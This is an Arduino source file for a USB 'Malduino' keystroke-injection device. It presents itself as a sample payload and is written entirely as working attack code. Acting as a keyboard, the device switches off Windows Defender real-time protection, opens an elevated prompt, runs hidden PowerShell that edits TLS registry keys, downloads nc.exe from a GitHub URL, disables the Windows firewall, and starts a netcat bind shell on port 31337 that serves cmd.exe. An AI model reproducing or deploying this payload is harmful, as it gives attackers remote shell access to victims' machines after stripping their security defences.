/*
  NC Reverse Shell Payload for GENERIC USB ATMEGA32U4 hw
  Copyright (c) 2021, Paulo C. Marcon (Licensed under MIT)
  For more information see: https://github.com/pcmarcon/malduino-payload-sample
*/

#include "Keyboard.h"
#include "Mouse.h"

#define blinkInterval 50
#define ledPin 13           // generic USB ATMEGA32U4 hw use ledpin 13

int defaultDelay = 4;
int defaultCharDelay = 5;
int rMin = 0;
int rMax = 100;
bool ledOn = true;

void typeKey(int key) {
  Keyboard.press(key);
  delay(defaultCharDelay);
  Keyboard.release(key);
}

void setup() {
  pinMode(ledPin, OUTPUT);
  digitalWrite(ledPin, HIGH);
  delay(1000);
  digitalWrite(ledPin, LOW);
  delay(1000);
  digitalWrite(ledPin, HIGH);
  delay(1000);
  digitalWrite(ledPin, LOW);
  delay(3000);             // extra time to help uploading new firmware
  Keyboard.begin();
  Mouse.begin();

  /* ----- Begin-Payload -----*/
    delay(1000);

    delay(defaultDelay);
    // Open Windows Defender settings

    delay(defaultDelay);
    Keyboard.press(KEY_LEFT_CTRL);
    Keyboard.press(KEY_LEFT_ESC);
    Keyboard.releaseAll();

    delay(defaultDelay);
    delay(1000);

    delay(defaultDelay);
    Keyboard.print("Windows Defender Settings");

    delay(defaultDelay);
    delay(100);

    delay(defaultDelay);
    typeKey(KEY_RETURN);

    delay(defaultDelay);
    // Navigate to realtime protection and disable it

    delay(defaultDelay);
    delay(1000);

    delay(defaultDelay);
    typeKey(KEY_RETURN);

    delay(defaultDelay);
    delay(1000);

    delay(defaultDelay);
    typeKey(KEY_RETURN);

    delay(defaultDelay);
    delay(1000);

    delay(defaultDelay);
    typeKey(KEY_TAB);

    delay(defaultDelay);
    delay(250);

    delay(defaultDelay);
    typeKey(KEY_TAB);

    delay(defaultDelay);
    delay(250);

    delay(defaultDelay);
    typeKey(KEY_TAB);

    delay(defaultDelay);
    delay(250);

    delay(defaultDelay);
    typeKey(KEY_TAB);

    delay(defaultDelay);
    typeKey(KEY_RETURN);

    delay(defaultDelay);
    delay(1000);

    delay(defaultDelay);
    typeKey(' ');

    delay(defaultDelay);
    delay(1000);

    delay(defaultDelay);
    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.press(121);
    Keyboard.releaseAll();

    delay(defaultDelay);
    delay(500);

    delay(defaultDelay);
    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.press(KEY_F4);
    Keyboard.releaseAll();

    delay(defaultDelay);
    delay(100);

    delay(defaultDelay);
    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.press(KEY_F4);
    Keyboard.releaseAll();

    delay(defaultDelay);
    delay(100);

    delay(defaultDelay);
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press(114);
    Keyboard.releaseAll();

    delay(defaultDelay);
    delay(200);

    delay(defaultDelay);
    Keyboard.print("cmd");

    delay(defaultDelay);
    delay(200);

    delay(defaultDelay);
    Keyboard.press(KEY_LEFT_CTRL);
    Keyboard.press(KEY_LEFT_SHIFT);
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();

    delay(defaultDelay);
    delay(500);

    delay(defaultDelay);
    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.press(121);
    Keyboard.releaseAll();

    delay(defaultDelay);
    delay(500);

    delay(defaultDelay);
    typeKey(KEY_LEFT_ESC);

    delay(defaultDelay);
    Keyboard.print("cd %temp%");

    delay(defaultDelay);
    typeKey(KEY_RETURN);

    delay(defaultDelay);
    Keyboard.print("powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden {New-Item 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Protocols\\TLS 1.3\\Server' -Force}");

    delay(defaultDelay);
    delay(100);

    delay(defaultDelay);
    typeKey(KEY_RETURN);

    delay(defaultDelay);
    Keyboard.print("powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden {New-ItemProperty -path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Protocols\\TLS 1.3\\Server' -name 'Enabled' -value '0' -PropertyType 'DWord' -Force}");

    delay(defaultDelay);
    delay(100);

    delay(defaultDelay);
    typeKey(KEY_RETURN);

    delay(defaultDelay);
    Keyboard.print("powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden {New-ItemProperty -path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Protocols\\TLS 1.3\\Server' -name 'DisabledByDefault' -value 1 -PropertyType 'DWord' -Force}");

    delay(defaultDelay);
    delay(100);

    delay(defaultDelay);
    typeKey(KEY_RETURN);

    delay(defaultDelay);
    Keyboard.print("powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden {New-Item 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Protocols\\TLS 1.3\\Client' -Force}");

    delay(defaultDelay);
    delay(100);

    delay(defaultDelay);
    typeKey(KEY_RETURN);

    delay(defaultDelay);
    Keyboard.print("powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden {reg add HKLM\\SOFTWARE\\Microsoft\\.NETFramework\\v4.0.30319 /v SystemDefaultTlsVersions /t REG_DWORD /d 1 /f /reg:64}");

    delay(defaultDelay);
    delay(100);

    delay(defaultDelay);
    typeKey(KEY_RETURN);

    delay(defaultDelay);
    Keyboard.print("powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden \"(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/pcmarcon/malduino-payload-samples/master/bin/nc.bin', 'nc.exe')\"");

    delay(defaultDelay);
    delay(100);

    delay(defaultDelay);
    typeKey(KEY_RETURN);

    delay(defaultDelay);
    delay(2000);

    delay(defaultDelay);
    Keyboard.print("netsh advfirewall set allprofiles state off");

    delay(defaultDelay);
    delay(100);

    delay(defaultDelay);
    typeKey(KEY_RETURN);

    delay(defaultDelay);
    Keyboard.print("powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden \"%temp%\\nc.exe -Lp 31337 -vv -e cmd.exe\"");

    delay(defaultDelay);
    delay(100);

    delay(defaultDelay);
    typeKey(KEY_RETURN);

    delay(defaultDelay);
    Keyboard.print("exit");

    delay(defaultDelay);
    delay(100);

    delay(defaultDelay);
    typeKey(KEY_RETURN);
   
  /* ----- End-Payload -----*/
  
  Keyboard.end();
}

void loop() {
  ledOn = !ledOn;
  digitalWrite(ledPin, ledOn);
  delay(blinkInterval);
}
